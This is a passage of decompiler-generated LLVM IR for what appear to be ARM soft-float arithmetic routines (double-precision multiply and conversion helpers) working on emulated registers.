  %v1_1d6a8 = phi i32 [ %v0_1d67c, %dec_label_pc_1d698 ], [ %v1_1d6a0, %bb32 ]
  ret i32 %v1_1d6a8

dec_label_pc_1d6ac:                               ; preds = %bb31
  %v0_1d6ac = load i32, i32* @r1, align 4
  %v1_1d6ac = load i32, i32* @r3, align 4
  %v4_1d6ac = icmp eq i32 %v1_1d6ac, %v0_1d6ac
  br i1 %v4_1d6ac, label %dec_label_pc_1d6ac..thread8_crit_edge, label %bb33

dec_label_pc_1d6ac..thread8_crit_edge:            ; preds = %dec_label_pc_1d6ac
  %v0_1d6bc.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1d6ac
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1d6ac..thread8_crit_edge, %bb33
  %v0_1d6bc = phi i32 [ %v0_1d6bc.pre, %dec_label_pc_1d6ac..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1d6bc = xor i1 %v4_1d6ac, true
  call void @__pseudo_cond_branch(i1 %v2_1d6bc, i32 %v0_1d6bc)
  %v0_1d6c0 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1d6c0, 2097152
  br i1 %tmp45, label %dec_label_pc_1d6c8, label %dec_label_pc_1d6dc

dec_label_pc_1d6c8:                               ; preds = %.thread8
  %v0_1d6c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d6c8 = icmp slt i32 %v0_1d6c8, 0
  %v2_1d6c8 = mul i32 %v0_1d6c8, 2
  store i32 %v2_1d6c8, i32* %r0.global-to-local, align 4
  %v0_1d6cc = load i32, i32* @r1, align 4
  %v3_1d6cc = mul i32 %v0_1d6cc, 2
  %v4_1d6cc = zext i1 %v1_1d6c8 to i32
  %v5_1d6cc = or i32 %v3_1d6cc, %v4_1d6cc
  %v9_1d6cc = icmp ule i32 %v5_1d6cc, %v0_1d6cc
  %v10_1d6cc = icmp ult i32 %v3_1d6cc, %v0_1d6cc
  %v11_1d6cc = select i1 %v1_1d6c8, i1 %v9_1d6cc, i1 %v10_1d6cc
  br i1 %v11_1d6cc, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1d6c8
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1d6c8, %bb34
  ret i32 %v2_1d6c8

dec_label_pc_1d6dc:                               ; preds = %.thread8
  %v2_1d6dc = icmp ugt i32 %v0_1d6c0, -4194305
  br i1 %v2_1d6dc, label %dec_label_pc_1d6dc..thread9_crit_edge, label %bb36

dec_label_pc_1d6dc..thread9_crit_edge:            ; preds = %dec_label_pc_1d6dc
  %v0_1d6e8.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1d6dc
  %v1_1d6e0 = load i32, i32* @r1, align 4
  %v2_1d6e0 = add i32 %v1_1d6e0, 1048576
  store i32 %v2_1d6e0, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1d6dc..thread9_crit_edge, %bb36
  %v0_1d6e8 = phi i32 [ %v0_1d6e8.pre, %dec_label_pc_1d6dc..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1d6e8 = xor i1 %v2_1d6dc, true
  call void @__pseudo_cond_branch(i1 %v2_1d6e8, i32 %v0_1d6e8)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1d71c.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1d71c.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1d708 = load i32, i32* @r3, align 4
  %v1_1d70c = load i32, i32* @r2, align 4
  store i32 %v1_1d70c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1d71c23 = phi i32 [ %v1_1d71c.pre, %.thread14 ], [ %v1_1d708, %bb37 ]
  %v1_1d718 = phi i32 [ %v0_1d67c, %.thread14 ], [ %v1_1d70c, %bb37 ]
  store i32 %v1_1d718, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1d728 = phi i32 [ %v1_1d71c23, %bb38 ], [ %v1_1d71c.pre, %.thread11 ]
  %v1_1d730 = phi i32 [ %v1_1d718, %bb38 ], [ %v0_1d67c, %.thread11 ]
  %v4_1d71c = mul i32 %v1_1d728, 4096
  %v5_1d71c = or i32 %v4_1d71c, %v1_1d730
  %v7_1d71c = icmp eq i32 %v5_1d71c, 0
  br i1 %v7_1d71c, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1d720 = load i32, i32* @r2, align 4
  %v2_1d720 = load i32, i32* @r3, align 4
  %v5_1d720 = mul i32 %v2_1d720, 4096
  %v6_1d720 = or i32 %v5_1d720, %v1_1d720
  %v8_1d720 = icmp eq i32 %v6_1d720, 0
  br i1 %v8_1d720, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1d724 = icmp eq i32 %v2_1d720, %v1_1d728
  br i1 %v5_1d724, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1d730

; uselistorder directives
  uselistorder i32 %v1_1d71c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1d6cc, { 1, 2, 0 }
  uselistorder i32 %v2_1d6c8, { 1, 0 }
  uselistorder i1 %v1_1d6c8, { 1, 0 }
  uselistorder i32 %v0_1d6c0, { 1, 0 }
  uselistorder i1 %v4_1d6ac, { 1, 0 }
  uselistorder i32 %v0_1d680, { 2, 0, 1 }
  uselistorder i32 %v0_1d67c, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1d698, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_1d734() local_unnamed_addr {
dec_label_pc_1d734:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_1d734 = load i32, i32* @r0, align 4
  %v2_1d734 = icmp eq i32 %v0_1d734, 0
  br i1 %v2_1d734, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_1d734
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1d734, %bb
  %v0_1d73c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1d734, i32 %v0_1d73c)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1d754 = call i32 @function_1d574()
  store i32 %v0_1d754, i32* @r0, align 4
  %v2_1d758 = icmp eq i32 %v0_1d754, 0
  br i1 %v2_1d758, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_1d760 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1d758, i32 %v0_1d760)
  store i32 1074, i32* @r4, align 4
  %v1_1d770 = and i32 %v0_1d754, -2147483648
  store i32 %v1_1d770, i32* @r5, align 4
  %v2_1d770 = icmp eq i32 %v1_1d770, 0
  br i1 %v2_1d770, label %bb22, label %bb21

bb21:                                             ; preds = %bb20
  %v2_1d774 = sub i32 0, %v0_1d754
  store i32 %v2_1d774, i32* @r0, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  store i32 0, i32* @r1, align 4
  %v0_1d77c = call i32 @function_1d574()
  %v2_1d780 = mul i32 %v0_1d77c, 2
  store i32 %v2_1d780, i32* %r2.global-to-local, align 4
  %v4_1d780 = icmp eq i32 %v2_1d780, 0
  %v1_1d784 = and i32 %v2_1d780, 4
  %v2_1d784 = icmp ne i32 %v1_1d784, 0
  %v3_1d784 = sdiv i32 %v2_1d780, 8
  %v3_1d788 = zext i1 %v2_1d784 to i32
  %v6_1d788 = zext i32 %v3_1d784 to i64
  %v7_1d788 = sub nsw i32 33, %v3_1d784
  %v8_1d788 = zext i32 %v7_1d788 to i64
  %v9_1d788 = shl i64 %v6_1d788, %v8_1d788
  %v10_1d788 = sub nsw i32 32, %v3_1d784
  %v11_1d788 = shl i32 %v3_1d788, %v10_1d788
  %v12_1d788 = zext i32 %v11_1d788 to i64
  %v14_1d788 = or i64 %v12_1d788, %v9_1d788
  %v15_1d788 = trunc i64 %v14_1d788 to i32
  store i32 %v15_1d788, i32* %r1.global-to-local, align 4
  %v3_1d78c = mul i32 %v0_1d77c, 536870912
  store i32 %v3_1d78c, i32* @r0, align 4
  br i1 %v4_1d780, label %.thread1, label %bb23

bb23:                                             ; preds = %bb22
  %v2_1d790 = and i32 %v2_1d780, -16777216
  store i32 %v2_1d790, i32* @r3, align 4
  %v4_1d790 = icmp eq i32 %v2_1d790, 0
  br i1 %v4_1d790, label %.thread1, label %bb24

bb24:                                             ; preds = %bb23
  %v4_1d794 = icmp ugt i32 %v2_1d780, -16777217
  br i1 %v4_1d794, label %.thread1, label %bb25

bb25:                                             ; preds = %bb24
  %v2_1d798 = xor i32 %v15_1d788, 939524096
  store i32 %v2_1d798, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb22, %bb23, %bb24, %bb25
  %v1_1d79c = phi i1 [ false, %bb23 ], [ false, %bb24 ], [ true, %bb25 ], [ false, %bb22 ]
  %v0_1d79c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1d79c, i32 %v0_1d79c)
  %v0_1d7a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d7a0 = icmp eq i32 %v0_1d7a0, 0
  br i1 %v2_1d7a0, label %dec_label_pc_1d7f0, label %bb26

bb26:                                             ; preds = %.thread1
  %v1_1d7a4 = load i32, i32* @r3, align 4
  %v4_1d7a4 = icmp eq i32 %v1_1d7a4, -16777216
  br label %dec_label_pc_1d7f0

dec_label_pc_1d7f0:                               ; preds = %.thread1, %bb26
  %v1_1d7a8 = phi i1 [ true, %.thread1 ], [ %v4_1d7a4, %bb26 ]
  %v0_1d7a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1d7a8, i32 %v0_1d7a8)
  store i32 896, i32* @r4, align 4
  %v0_1d7b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d7b4 = and i32 %v0_1d7b4, -2147483648
  store i32 %v1_1d7b4, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1d7b4 to float
  %tmp32 = call float @fabsf(float %tmp)
  %v1_1d7b8 = bitcast float %tmp32 to i32
  store i32 %v1_1d7b8, i32* @r1, align 4
  %v0_1d7bc = call i32 @function_1d574()
  %v1_1d7c0 = load i32, i32* @r1, align 4
  %v2_1d7c0 = or i32 %v1_1d7c0, %v0_1d7bc
  store i32 %v2_1d7c0, i32* %r2.global-to-local, align 4
  %v4_1d7c0 = icmp eq i32 %v2_1d7c0, 0
  %v0_1d7c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1d7c0, i32 %v0_1d7c4)
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1d7f8 = load i32, i32* @r1, align 4
  %tmp33 = icmp ult i32 %v0_1d7f8, 4194304
  call void @__pseudo_cond_branch(i1 %tmp33, i32 ptrtoint (i32* @global_var_1d514.1162 to i32))
  %tmp34 = icmp ult i32 %v0_1d7f8, 33554432
  br i1 %tmp34, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_1d7f0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1d7f0, %bb27
  %v1_1d810 = phi i32 [ 6, %bb27 ], [ 3, %dec_label_pc_1d7f0 ]
  %tmp35 = icmp ult i32 %v0_1d7f8, 268435456
  br i1 %tmp35, label %bb30, label %bb29

bb29:                                             ; preds = %bb28
  %v2_1d810 = add nuw nsw i32 %v1_1d810, 3
  br label %bb30

bb30:                                             ; preds = %bb28, %bb29
  %v0_1d814 = phi i32 [ %v2_1d810, %bb29 ], [ %v1_1d810, %bb28 ]
  %not. = icmp slt i32 %v0_1d7f8, 0
  %v4_1d814 = zext i1 %not. to i32
  %v5_1d814 = add nsw i32 %v0_1d814, %v4_1d814
  store i32 %v5_1d814, i32* %r2.global-to-local, align 4
  %v1_1d818 = sub nsw i32 32, %v5_1d814
  %v6_1d81c = shl i32 %v0_1d7bc, %v1_1d818
  store i32 %v6_1d81c, i32* @ip, align 4
  %v6_1d820 = lshr i32 %v0_1d7bc, %v5_1d814
  %v1_1d824 = load i32, i32* @r1, align 4
  %v7_1d824 = shl i32 %v1_1d824, %v1_1d818
  %v8_1d824 = or i32 %v7_1d824, %v6_1d820
  %v6_1d828 = lshr i32 %v1_1d824, %v5_1d814
  store i32 %v6_1d828, i32* %r1.global-to-local, align 4
  %v0_1d82c = load i32, i32* %r4.global-to-local, align 4
  %v2_1d82c = add i32 %v0_1d82c, %v5_1d814
  store i32 %v2_1d82c, i32* @r4, align 4
  %v4_1d830 = sext i32 %v8_1d824 to i64
  %v5_1d830 = call i32 @function_1d514(i64 %v4_1d830, i32 %v6_1d828, i32 %v5_1d814, i32 %v1_1d818)
  ret i32 %v5_1d830

; uselistorder directives
  uselistorder i32 %v5_1d814, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_1d7bc, { 1, 2, 0 }
  uselistorder i32 %v3_1d784, { 1, 2, 0 }
  uselistorder i32 %v2_1d780, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 3, { 53, 0, 49, 64, 50, 65, 66, 67, 19, 69, 11, 70, 20, 71, 72, 1, 16, 73, 12, 2, 3, 56, 75, 4, 5, 41, 42, 84, 43, 44, 45, 46, 47, 48, 76, 9, 24, 77, 68, 25, 26, 58, 27, 59, 28, 60, 29, 61, 30, 62, 54, 10, 55, 85, 17, 79, 22, 80, 21, 81, 23, 83, 51, 13, 74, 14, 8, 15, 78, 6, 82, 52, 31, 57, 32, 7, 34, 33, 40, 63, 35, 36, 37, 38, 39, 18 }
  uselistorder i32 6, { 0, 24, 25, 4, 16, 17, 26, 27, 28, 29, 5, 6, 31, 3, 1, 7, 30, 2, 8, 9, 10, 11, 12, 18, 19, 20, 21, 15, 22, 23, 13, 14 }
  uselistorder i32 ()* @function_1d574, { 2, 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_1d7f0, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_1d834(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1d834:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1d834 = load i32, i32* @r4, align 4
  store i32 %v3_1d834, i32* %stack_var_-16, align 4
  %v6_1d834 = load i32, i32* @r5, align 4
  %v9_1d834 = load i32, i32* @r6, align 4
  %v12_1d834 = load i32, i32* @lr, align 4
  store i32 2047, i32* @ip, align 4
  %v4_1d840 = udiv i32 %arg2, 1048576
  %v5_1d840 = urem i32 %v4_1d840, 2048
  store i32 %v5_1d840, i32* %r4.global-to-local, align 4
  %v6_1d840 = icmp eq i32 %v5_1d840, 0
  br i1 %v6_1d840, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_1d834
  %v5_1d844 = udiv i32 %arg4, 1048576
  %v6_1d844 = urem i32 %v5_1d844, 2048
  store i32 %v6_1d844, i32* @r5, align 4
  %v7_1d844 = icmp eq i32 %v6_1d844, 0
  br i1 %v7_1d844, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1d848 = icmp eq i32 %v5_1d840, 2047
  br i1 %v5_1d848, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1d84c = icmp eq i32 %v6_1d844, 2047
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1d834, %bb, %bb38, %bb39
  %v0_1d850 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1d84c, %bb39 ], [ true, %dec_label_pc_1d834 ]
  store i32 ptrtoint (i32* @global_var_1d854.1166 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1d850, i32 ptrtoint (i32* @global_var_1da2c.1164 to i32))
  %v0_1d854 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d854 = load i32, i32* @r5, align 4
  %v2_1d854 = add i32 %v1_1d854, %v0_1d854
  store i32 %v2_1d854, i32* %r4.global-to-local, align 4
  %v2_1d858 = xor i32 %arg4, %arg2
  %v1_1d85c = load i32, i32* @ip, align 4
  %tmp51 = mul i32 %v1_1d85c, -2097152
  %v5_1d85c = add i32 %tmp51, -1
  %v6_1d85c = and i32 %v5_1d85c, %arg2
  store i32 %v6_1d85c, i32* %r1.global-to-local, align 4
  %v6_1d860 = and i32 %v5_1d85c, %arg4
  %v5_1d864 = mul i32 %arg2, 4096
  %v6_1d864 = or i32 %v5_1d864, %tmp32
  store i32 %v6_1d864, i32* @r5, align 4
  %v8_1d864 = icmp eq i32 %v6_1d864, 0
  br i1 %v8_1d864, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1d86c5 = or i32 %v6_1d85c, 1048576
  store i32 %v1_1d86c5, i32* %r1.global-to-local, align 4
  %v1_1d8707 = or i32 %v6_1d860, 1048576
  br label %dec_label_pc_1d8f0

bb40:                                             ; preds = %.thread2
  %v6_1d868 = mul i32 %arg4, 4096
  %v7_1d868 = or i32 %v6_1d868, %arg3
  store i32 %v7_1d868, i32* @r5, align 4
  %v9_1d868 = icmp eq i32 %v7_1d868, 0
  %v1_1d86c = or i32 %v6_1d85c, 1048576
  store i32 %v1_1d86c, i32* %r1.global-to-local, align 4
  %v1_1d870 = or i32 %v6_1d860, 1048576
  br i1 %v9_1d868, label %dec_label_pc_1d8f0, label %dec_label_pc_1d878

dec_label_pc_1d878:                               ; preds = %bb40
  %v6_1d878 = mul nuw i64 %tmp, %arg1
  %v7_1d878 = udiv i64 %v6_1d878, 4294967296
  %v9_1d878 = trunc i64 %v6_1d878 to i32
  %v7_1d880 = zext i32 %v1_1d86c to i64
  %v11_1d880 = mul nuw nsw i64 %v7_1d880, %tmp
  %v12_1d880 = add i64 %v11_1d880, %v7_1d878
  %v1_1d884 = and i32 %v2_1d858, -2147483648
  %v10_1d888 = zext i32 %v1_1d870 to i64
  %v11_1d888 = mul nuw i64 %v10_1d888, %arg1
  %v12_1d888 = add i64 %v12_1d880, %v11_1d888
  %v13_1d888 = udiv i64 %v12_1d888, 4294967296
  %v15_1d888 = trunc i64 %v12_1d888 to i32
  %v10_1d890 = mul nuw i64 %v10_1d888, %v7_1d880
  %v11_1d890 = add i64 %v13_1d888, %v10_1d890
  %v12_1d890 = udiv i64 %v11_1d890, 4294967296
  %v13_1d890 = trunc i64 %v12_1d890 to i32
  %v14_1d890 = trunc i64 %v11_1d890 to i32
  %v2_1d894 = icmp eq i32 %v9_1d878, 0
  br i1 %v2_1d894, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1d878
  %v2_1d898 = or i32 %v15_1d888, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1d878, %bb41
  %storemerge = phi i32 [ %v2_1d898, %bb41 ], [ %v15_1d888, %dec_label_pc_1d878 ]
  %v0_1d8ac = phi i32 [ %v2_1d898, %bb41 ], [ %v15_1d888, %dec_label_pc_1d878 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1d89c = add i32 %v2_1d854, -255
  %v2_1d8a0 = icmp ugt i32 %v13_1d890, 511
  %v2_1d8a4 = icmp eq i1 %v2_1d8a0, false
  %v3_1d8a4 = add i32 %v2_1d854, -1023
  %v5_1d8a4 = sext i1 %v2_1d8a4 to i32
  %v6_1d8a4 = add i32 %v3_1d8a4, %v5_1d8a4
  store i32 %v6_1d8a4, i32* %r4.global-to-local, align 4
  %v3_1d8a8 = icmp ugt i32 %v1_1d89c, 768
  br i1 %v3_1d8a8, label %dec_label_pc_1d8b8, label %dec_label_pc_1d8ac

dec_label_pc_1d8ac:                               ; preds = %bb42
  %v1_1d8ac = icmp slt i32 %v0_1d8ac, 0
  %v2_1d8ac = mul i32 %v0_1d8ac, 2
  store i32 %v2_1d8ac, i32* %lr.global-to-local, align 4
  %v3_1d8b0 = mul i32 %v14_1d890, 2
  %v4_1d8b0 = zext i1 %v1_1d8ac to i32
  %v5_1d8b0 = or i32 %v4_1d8b0, %v3_1d8b0
  %v9_1d8b0 = icmp ule i32 %v5_1d8b0, %v14_1d890
  %v10_1d8b0 = icmp ult i32 %v3_1d8b0, %v14_1d890
  %v11_1d8b0 = select i1 %v1_1d8ac, i1 %v9_1d8b0, i1 %v10_1d8b0
  %v3_1d8b425 = mul nuw nsw i64 %v12_1d890, 2
  %v3_1d8b4 = trunc i64 %v3_1d8b425 to i32
  %v4_1d8b4 = zext i1 %v11_1d8b0 to i32
  %v5_1d8b4 = or i32 %v4_1d8b4, %v3_1d8b4
  br label %dec_label_pc_1d8b8

dec_label_pc_1d8b8:                               ; preds = %bb42, %dec_label_pc_1d8ac
  %v0_1d8c8 = phi i32 [ %v0_1d8ac, %bb42 ], [ %v2_1d8ac, %dec_label_pc_1d8ac ]
  %v0_1d8c0 = phi i32 [ %v14_1d890, %bb42 ], [ %v5_1d8b0, %dec_label_pc_1d8ac ]
  %v1_1d8b8 = phi i32 [ %v13_1d890, %bb42 ], [ %v5_1d8b4, %dec_label_pc_1d8ac ]
  %v4_1d8b8 = mul i32 %v1_1d8b8, 2048
  %v4_1d8bc = udiv i32 %v0_1d8c0, 2097152
  %v5_1d8b8 = or i32 %v4_1d8bc, %v1_1d884
  %v5_1d8bc = or i32 %v5_1d8b8, %v4_1d8b8
  store i32 %v5_1d8bc, i32* %r1.global-to-local, align 4
  %v3_1d8c0 = mul i32 %v0_1d8c0, 2048
  %v4_1d8c4 = udiv i32 %v0_1d8c8, 2097152
  %v5_1d8c4 = or i32 %v3_1d8c0, %v4_1d8c4
  store i32 %v5_1d8c4, i32* %r0.global-to-local, align 4
  %v3_1d8c8 = mul i32 %v0_1d8c8, 2048
  store i32 %v3_1d8c8, i32* %lr.global-to-local, align 4
  %v1_1d8cc = add i32 %v6_1d8a4, -253
  store i32 %v1_1d8cc, i32* @ip, align 4
  %v2_1d8cc = icmp ugt i32 %v6_1d8a4, 252
  %v7_1d8cc = icmp eq i32 %v6_1d8a4, 253
  %v2_1d8d0 = xor i1 %v7_1d8cc, true
  %v3_1d8d0 = and i1 %v2_1d8cc, %v2_1d8d0
  br i1 %v3_1d8d0, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1d8b8
  %v6_1d8d0 = icmp ugt i32 %v1_1d8cc, 1791
  %v11_1d8d0 = icmp eq i32 %v1_1d8cc, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1d8b8, %bb43
  %v1_1d8d4 = phi i1 [ %v7_1d8cc, %dec_label_pc_1d8b8 ], [ %v11_1d8d0, %bb43 ]
  %v0_1d8d4 = phi i1 [ %v2_1d8cc, %dec_label_pc_1d8b8 ], [ %v6_1d8d0, %bb43 ]
  %v2_1d8d4 = xor i1 %v1_1d8d4, true
  %v3_1d8d4 = and i1 %v0_1d8d4, %v2_1d8d4
  call void @__pseudo_cond_branch(i1 %v3_1d8d4, i32 ptrtoint (i32* @global_var_1d920.1165 to i32))
  %v0_1d8d8 = load i32, i32* %lr.global-to-local, align 4
  %v2_1d8d8 = icmp slt i32 %v0_1d8d8, 0
  %v6_1d8d8 = icmp eq i32 %v0_1d8d8, -2147483648
  %v1_1d8dc = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1d8d8, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1d8dc = urem i32 %v1_1d8dc, 2
  %v3_1d8dc = icmp ne i32 %v2_1d8dc, 0
  %v4_1d8dc = udiv i32 %v1_1d8dc, 2
  store i32 %v4_1d8dc, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1d8e0 = phi i1 [ %v3_1d8dc, %bb45 ], [ %v2_1d8d8, %bb44 ]
  %v2_1d8e0 = zext i1 %v1_1d8e0 to i32
  %v3_1d8e0 = add i32 %v2_1d8e0, %v1_1d8dc
  store i32 %v3_1d8e0, i32* %r0.global-to-local, align 4
  %v0_1d8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d8e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1d8e4 = and i32 %v1_1d8e4, 4096
  %v3_1d8e4 = icmp ne i32 %v2_1d8e4, 0
  %v4_1d8e4 = mul i32 %v1_1d8e4, 1048576
  %v6_1d8e4 = add i32 %v4_1d8e4, %v0_1d8e4
  %v7_1d8e4 = zext i1 %v3_1d8e4 to i32
  %v8_1d8e4 = add i32 %v7_1d8e4, %v6_1d8e4
  store i32 %v8_1d8e4, i32* %r1.global-to-local, align 4
  %v2_1d8e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d8e8, i32* @r4, align 4
  store i32 %v6_1d834, i32* @r5, align 4
  store i32 %v9_1d834, i32* @r6, align 4
  store i32 %v12_1d834, i32* @lr, align 4
  ret i32 %v3_1d8e0

dec_label_pc_1d8f0:                               ; preds = %.thread3, %bb40
  %v1_1d8fc = phi i32 [ %v1_1d8707, %.thread3 ], [ %v1_1d870, %bb40 ]
  %v1_1d8f4 = phi i32 [ %v1_1d86c5, %.thread3 ], [ %v1_1d86c, %bb40 ]
  %v1_1d8f0 = and i32 %v2_1d858, -2147483648
  store i32 %v1_1d8f0, i32* @r6, align 4
  %v2_1d8f4 = or i32 %v1_1d8f4, %v1_1d8f0
  %v4_1d8f81 = or i64 %tmp, %arg1
  %v4_1d8f8 = trunc i64 %v4_1d8f81 to i32
  store i32 %v4_1d8f8, i32* %r0.global-to-local, align 4
  %v2_1d8fc = xor i32 %v2_1d8f4, %v1_1d8fc
  store i32 %v2_1d8fc, i32* %r1.global-to-local, align 4
  %v4_1d900 = udiv i32 %v1_1d85c, 2
  %v5_1d900 = sub i32 %v2_1d854, %v4_1d900
  store i32 %v5_1d900, i32* %r4.global-to-local, align 4
  %v7_1d900 = sub i32 0, %v5_1d900
  %v8_1d900 = and i32 %v2_1d854, %v7_1d900
  %v11_1d900 = icmp eq i32 %v2_1d854, %v4_1d900
  %v7_1d904 = icmp sgt i32 %v2_1d854, %v4_1d900
  br i1 %v7_1d904, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1d8f0
  %v10_1d904 = sub i32 %v1_1d85c, %v5_1d900
  store i32 %v10_1d904, i32* @r5, align 4
  %v12_1d904 = xor i32 %v5_1d900, %v1_1d85c
  %v13_1d904 = xor i32 %v10_1d904, %v1_1d85c
  %v14_1d904 = and i32 %v13_1d904, %v12_1d904
  %v17_1d904 = icmp eq i32 %v1_1d85c, %v5_1d900
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1d8f0, %bb46
  %v3_1d910.in = phi i32 [ %v8_1d900, %dec_label_pc_1d8f0 ], [ %v14_1d904, %bb46 ]
  %v2_1d910.in = phi i32 [ %v5_1d900, %dec_label_pc_1d8f0 ], [ %v10_1d904, %bb46 ]
  %v1_1d910 = phi i1 [ %v11_1d900, %dec_label_pc_1d8f0 ], [ %v17_1d904, %bb46 ]
  %v2_1d910 = icmp slt i32 %v2_1d910.in, 0
  %v3_1d910 = icmp slt i32 %v3_1d910.in, 0
  %v3_1d908 = xor i1 %v3_1d910, %v2_1d910
  %v4_1d908 = or i1 %v1_1d910, %v3_1d908
  br i1 %v4_1d908, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1d910.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1d90830 = mul i32 %v5_1d900, 1048576
  %v10_1d90831 = or i32 %v2_1d8fc, %v9_1d90830
  store i32 %v10_1d90831, i32* %r1.global-to-local, align 4
  %v7_1d90c = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1d90c, i32* %r4.global-to-local, align 4
  store i32 %v6_1d834, i32* @r5, align 4
  store i32 %v9_1d834, i32* @r6, align 4
  store i32 %v12_1d834, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1d910 = phi i32 [ %v0_1d910.pre, %._crit_edge23 ], [ %v12_1d834, %bb48 ]
